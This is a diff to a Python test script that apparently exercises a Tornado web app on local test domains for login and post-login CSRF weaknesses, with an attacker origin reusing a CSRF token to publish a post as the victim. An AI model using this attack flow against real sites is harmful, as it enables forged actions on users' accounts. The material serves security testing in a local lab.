@@ -1,9 +1,15 @@
 import requests
 from bs4 import BeautifulSoup
 import random
+import os
 
-TARGET = 'http://localtest.me/'
-ATTACKER = 'http://attack.localtest.me/'
+
+try:
+    PROTOCOL = os.environ['PROTOCOL']
+except:
+    PROTOCOL = 'http'
+TARGET = f'{PROTOCOL}://localtest.me/'
+ATTACKER = f'{PROTOCOL}://attack.localtest.me/'
 PRIVATE_KEY = './server/localtest.me.crt'
 
 USER1 = 'alice'
@@ -25,11 +31,11 @@ def get_csrf_token(page):
     return token
 
 def create_user(user, email, password = PASSWORD):
-    r = s.get(TARGET + 'auth/create', verify = False)
+    r = s.get(TARGET + 'auth/create')
     csrf_token = get_csrf_token(r.text)
 
     data = {'email' : email, 'name' : user, 'password' : PASSWORD, '_xsrf' : csrf_token}
-    r = s.post(TARGET + 'auth/create', data = data, verify = False)
+    r = s.post(TARGET + 'auth/create', data = data)
     assert 'Sign out' in r.text
 
 
@@ -65,12 +71,12 @@ def csrf_post_tornado(csrf_token, my_text):
 with requests.Session() as s:
     print("[+] Testing login")
 
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET, verify = PRIVATE_KEY)
     create_user(USER1, EMAIL1)
     logout_tornado()
 
     ### Access main page
-    r = s.get(TARGET, verify = False)
+    r = s.get(TARGET)
     assert 'Sign in' in r.text
 
     r = login_tornado(EMAIL1)
@@ -83,14 +89,14 @@ with requests.Session() as s:
 with requests.Session() as s:
     print("[+] Testing post-login CSRF attack")
 
-    r_target = s.get(TARGET, verify = False)
+    r_target = s.get(TARGET, verify = PRIVATE_KEY)
     assert "Sign in" in r_target.text
 
     ### TARGET LOGIN
     r_target = login_tornado(EMAIL1)
 
     ### Attacker Setting Post-Session
-    s.get(ATTACKER, verify = False)
+    s.get(ATTACKER, verify = PRIVATE_KEY)
     r_attacker = s.get(ATTACKER + 'set_post_session')
     ### extract csrf token to use later
     csrf_token_attacker = get_csrf_token(r_attacker.text)
@@ -103,7 +109,7 @@ with requests.Session() as s:
     assert f"This post was created from the attacker.site (published by {USER1})" in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
     assert new_text in r_attacker.text, " NOT VULNERABLE to pre-login CSRF attack"
 
-    r_target = s.get(TARGET, verify = False)
+    r_target = s.get(TARGET)
     assert f"This post was created from the attacker.site (published by {USER1})" in r_target.text
     assert new_text in r_target.text
 
